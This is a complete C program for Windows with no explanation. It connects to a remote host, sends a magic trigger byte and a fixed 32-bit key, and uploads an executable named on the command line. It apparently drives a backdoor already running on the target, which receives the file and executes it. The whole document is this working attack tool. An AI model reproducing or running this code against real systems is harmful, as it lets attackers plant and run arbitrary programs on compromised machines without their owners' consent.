#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ws2_32.lib")

#define SOCKS4_EXECBYTE  133

#pragma pack(push, 1)
struct xrequest_t {
	unsigned char magic;
	unsigned long polinomial;
};
#pragma pack(pop)

void main(int argc, char *argv[])
{
	FILE *f;
	int sock, i, j, is_eof;
	struct hostent *hent;
	struct sockaddr_in addr;
	struct xrequest_t req;
	struct timeval tv;
	fd_set fds;
	char buf[1024];
	WSADATA wd;

	WSAStartup(MAKEWORD(1,1), &wd);
	if (argc < 4) {
		printf("Usage: %s <hostname> <port> <filename.exe>\n", argv[0]);
		return;
	}
	f = fopen(argv[3], "rb");
	if (f == NULL) {
		printf("%s: can't open file \"%s\"\n", argv[0], argv[3]);
		return;
	}
	hent = gethostbyname(argv[1]);
	if (hent == NULL) {
		printf("%s: host lookup failed (hostname=\"%s\")\n", argv[0], argv[1]);
		return;
	}
	addr.sin_family = AF_INET;
	addr.sin_addr = *(struct in_addr *)hent->h_addr_list[0];
	addr.sin_port = htons(atoi(argv[2]));
	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock <= 0) {
		printf("%s: can't create TCP socket\n", argv[0]);
		return;
	}
	if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
		printf("%s: can't connect to %s:%d\n", argv[0], argv[1], ntohs(addr.sin_port));
		return;
	}

	printf("[+] Connection established\n");

	req.magic = SOCKS4_EXECBYTE;
	req.polinomial = htonl(0x133C9EA2);
	send(sock, (char *)&req, sizeof(req), 0);

	for (i=0, is_eof=0;;) {
		tv.tv_sec = 0;
		tv.tv_usec = 0;
		FD_ZERO(&fds);
		FD_SET(sock, &fds);
		if (select(sock+1, &fds, NULL, NULL, &tv) == 1) {
			memset(buf, '\0', sizeof(buf));
			j = recv(sock, buf, sizeof(buf)-1, 0);
			if (j <= 0) {
				printf("[*] Connection dropped\n");
				return;
			}
			buf[j] = 0;
			printf("%s\n", buf);
		}
		if (is_eof) continue;
		j = fread(buf, 1, sizeof(buf), f);
		if (j < 0) {
			printf("[-] fread() failed\n");
			return;
		}
		if (j == 0) {
			is_eof = 1;
			printf("[+] File has been successfully sent\n");
			closesocket(sock);
			return;
		}
		j = send(sock, buf, j, 0);
		if (j <= 0) {
			printf("[*] send() failed - connection dropped\n");
			return;
		}
		i += j;
		printf("[%u bytes sent]\r", i);
	}
}
